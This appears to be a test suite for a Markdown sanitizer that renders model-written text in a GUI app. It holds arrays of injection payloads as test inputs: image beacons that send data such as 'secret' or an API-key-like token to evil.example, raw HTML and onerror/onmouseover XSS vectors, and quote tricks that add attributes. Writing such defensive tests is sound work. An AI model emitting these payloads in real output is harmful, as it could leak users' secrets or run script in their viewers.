import { describe, expect, test } from "bun:test"
import { createMarkdownParser } from "@opencode/ui/context/marked-parser"
import {
  JOINER,
  neutralizeMarkdown,
  restoreQuotes,
  splitMarkdown,
  stripJoiners,
} from "../../src/gui/components/markdown.ts"

// The app renders ui.Markdown with this parser (@opencode/ui marked-base plus its code and math extensions), so the
// tests check what marked makes of the neutralized text.
const parser = createMarkdownParser()

/** What ui.Markdown would render for a model-written Markdown string, as MarkdownText prepares it. */
function render(text: string): string {
  return splitMarkdown(text)
    .map((part) =>
      part.kind === "code"
        ? `<pre data-ui-code>${part.code.replaceAll("&", "&amp;").replaceAll("<", "&lt;")}</pre>`
        : (parser.parse(neutralizeMarkdown(part.text, "Image"), { async: false }) as string),
    )
    .join("")
}

/** Tags marked and its code highlighting generate from Markdown syntax; anything else came from raw HTML. */
const MARKDOWN_TAGS = new Set(
  "p a em strong code pre ul ol li blockquote h1 h2 h3 h4 h5 h6 hr br table thead tbody tr th td del input span div math semantics mrow mi mn mo annotation".split(
    " ",
  ),
)

/** The real tags of rendered HTML (text from the source is escaped, so every `<` left starts a tag). */
function tags(html: string): { readonly name: string; readonly attributes: string }[] {
  return [...html.matchAll(/<\/?([a-zA-Z][\w-]*)([^>]*)>/g)].map((match) => ({
    name: match[1]!.toLowerCase(),
    attributes: match[2]!,
  }))
}

const ATTACKS = [
  "![x](https://evil.example/p.gif?d=secret)",
  "![](https://evil.example/p.gif)",
  'Status: ![ok](https://evil.example/p.gif "title")',
  "![x][r]\n\n[r]: https://evil.example/p.gif",
  "![r]\n\n[r]: https://evil.example/p.gif",
  "![r][]\n\n[r]: https://evil.example/p.gif",
  "!![x](https://evil.example/p.gif)",
  "!!!![x](https://evil.example/p.gif)",
  "\\![x](https://evil.example/p.gif)",
  "`code` ![x](https://evil.example/p.gif)",
  "[![x](https://evil.example/p.gif)](https://example.com)",
  "<img src=https://evil.example/p.gif>",
  "<IMG SRC=x onerror=alert(1)>",
  "</p><img src=x>",
  "<!-- c --><img src=x>",
  "<div>\n<img src=x>\n</div>",
  "<style>body{background:url(https://evil.example)}</style>",
  'a <span style="background:url(https://evil.example)">b</span>',
  "[a](https://e/`)<img src=x>`",
  "<https://a`>![x](u)`",
  "- item\n  ```\n  code\nnot indented <img src=x>",
  '[a]: https://x "title\n```"\n<img src=x>\n```',
  "~~~\n```\n~~~\n<img src=x>",
  "```js`\n<img src=x>\n```",
  "    indented\n<img src=x>",
  "> ```\n> <img src=x>",
  "| a |\n| - |\n| <img src=x> |",
  "<svg><image href=x></image></svg>",
  "<?xml version='1.0'?><img src=x>",
  "<![CDATA[x]]><img src=x>",
  "<!DOCTYPE html><img src=x>",
  "text\n```\n<img src=x>",
  "$x$ <img src=x> $y$",
  '<a href="https://evil.example">x</a>',
  "<iframe src=https://evil.example></iframe>",
  "<video poster=https://evil.example></video>",
  "<input type=image src=x>",
  "<object data=https://evil.example></object>",
  "<link rel=stylesheet href=https://evil.example>",
  "* <img src=x>\n* ![a](https://evil.example)",
  "# <img src=x>\n\n**<img src=x>**",
  "<img\nsrc=x>",
]

describe("neutralizeMarkdown", () => {
  test.each(ATTACKS)("renders no image and no raw HTML: %j", (attack) => {
    const html = render(attack)
    for (const tag of tags(html)) {
      expect(MARKDOWN_TAGS.has(tag.name), `<${tag.name}> in ${html}`).toBe(true)
      // Nothing that loads or runs anything (the highlighter's own <pre style> sets colors only).
      expect(tag.attributes, html).not.toMatch(/\s(src|srcset|poster|data|on\w+)\s*=|url\(/i)
    }
  })

  // The app's link renderer writes href and title unescaped: a quote would end the attribute and add new ones.
  const QUOTE_ATTACKS = [
    '[ok](https://x"style="background-image:url(https://evil.example/p.gif)")',
    '![ok](https://x"style="background-image:url(https://evil.example/p.gif?d=sk-live-123)")',
    "[ok](https://x 'a\" style=\"background:url(https://evil.example)')",
    '[ok](https://x (a" onfocus="alert(1)" autofocus="))',
    '[ok][r]\n\n[r]: https://x"style="background:url(https://evil.example)"',
    '[ok](#x"onmouseover="alert(1))',
    'see https://x"style="background:url(https://evil.example/p.gif)" now',
    '<https://x"style="background:url(https://evil.example/p.gif)">',
    'www.x.com/"style="background:url(https://evil.example/p.gif)"',
    '[a](https://x`"style="background:url(https://evil.example)"`)',
    '[a](https://x\\"style=\\"background:url(https://evil.example)\\")',
    '`x` [a](https://x"onmouseover="alert(1))',
  ]

  test.each(QUOTE_ATTACKS)("a quote in a link cannot add attributes: %j", (attack) => {
    const html = render(attack)
    for (const tag of tags(html)) {
      // Attribute names as a browser reads them: a new attribute may start right after a quoted value.
      const names = [...tag.attributes.matchAll(/([^\s"'=<>`/]+)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?/g)].map(
        (match) => match[1]!.toLowerCase(),
      )
      const allowed = tag.name === "a" ? ["href", "title", "class", "target", "rel"] : ["class"]
      expect(
        names.filter((name) => !allowed.includes(name)),
        html,
      ).toEqual([])
    }
  })

  test("quotes still read as quotes, in prose, link text and code", () => {
    // What the browser shows: entities decoded, then MarkdownText's restoreQuotes over the text nodes.
    const shown = (text: string) =>
      restoreQuotes(
        stripJoiners(render(text))
          .replace(/<[^>]+>/g, "")
          .replace(/&#34;/g, '"')
          .replace(/&quot;/g, '"')
          .replace(/&#39;/g, "'")
          .replace(/&lt;/g, "<")
          .replace(/&gt;/g, ">")
          .replace(/&amp;/g, "&"),
      ).trim()
    expect(shown('Say "hi" to [the "team"](https://example.com)')).toBe('Say "hi" to the "team"')
    expect(shown('Set `"mode": "fast"` and `say \\"hi\\"`')).toBe('Set "mode": "fast" and say \\"hi\\"')
    expect(shown('- item\n\n      {"a": 1}')).toBe('item\n{"a": 1}')
    expect(render('[t](https://example.com/?q="x")')).toContain('href="https://example.com/?q=&#34;x&#34;"')
  })

  test("images become links, with a label when they have no alt text", () => {
    expect(render("See ![the logo](https://x.example/logo.png).")).toContain(
      '<a href="https://x.example/logo.png" class="external-link" target="_blank" rel="noopener noreferrer">the logo</a>',
    )
    expect(render("![](https://x.example/a.png)")).toContain(">Image</a>")
    expect(render("Wow!![x](https://x.example/a.png)")).toContain(">x</a>")
  })

  test("raw HTML shows as text, the joiner invisible", () => {
    const html = render("Use <kbd>Ctrl</kbd> or a <b>bold</b> word")
    expect(stripJoiners(html)).toContain("Use &lt;kbd&gt;Ctrl&lt;/kbd&gt; or a &lt;b&gt;bold&lt;/b&gt; word")
  })

  test("leaves code, comparisons and autolinks reading the same", () => {
    expect(stripJoiners(render("Use `Array<string>` here"))).toContain("<code>Array&lt;string&gt;</code>")
    expect(stripJoiners(render("Markdown: `![alt](src)`"))).toContain("<code>![alt](src)</code>")
    expect(render("a < b and c > d")).toContain("a &lt; b and c &gt; d")
    expect(render("<https://example.com/docs>")).toContain('<a href="https://example.com/docs"')
    expect(render("plain **bold** and [a link](https://example.com)")).toContain('<a href="https://example.com"')
  })

  test("adds nothing to text without images, tags or quotes", () => {
    const text = "# Title\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\nA [link](https://example.com)."
    expect(neutralizeMarkdown(text, "Image")).toBe(text)
  })
})

describe("splitMarkdown", () => {
  test("splits top-level fenced code blocks out, exactly as written", () => {
    expect(splitMarkdown("Intro\n\n```ts\nconst a: Array<string> = []\n```\n\nOutro")).toEqual([
      { kind: "markdown", text: "Intro\n" },
      { kind: "code", code: "const a: Array<string> = []", language: "ts" },
      { kind: "markdown", text: "\nOutro" },
    ])
    expect(splitMarkdown("~~~~\n```\nnested\n```\n~~~~")).toEqual([{ kind: "code", code: "```\nnested\n```" }])
    expect(splitMarkdown("text\n```sh\nunclosed")).toEqual([
      { kind: "markdown", text: "text" },
      { kind: "code", code: "unclosed", language: "sh" },
    ])
  })

  test("leaves indented, math and invalid fences in the Markdown", () => {
    const listed = "1. Step\n   ```sh\n   npm i\n   ```\n2. Next"
    expect(splitMarkdown(listed)).toEqual([{ kind: "markdown", text: listed }])
    const math = "```math\nx^2\n```"
    expect(splitMarkdown(math)).toEqual([{ kind: "markdown", text: math }])
    const invalid = "```js`\ncode\n```"
    expect(splitMarkdown(invalid)).toEqual([
      { kind: "markdown", text: "```js`\ncode" },
      { kind: "code", code: "" },
    ])
  })

  test("the joiner is U+2060", () => {
    expect(JOINER).toBe("\u2060")
    expect(stripJoiners(`a<${JOINER}b`)).toBe("a<b")
  })
})
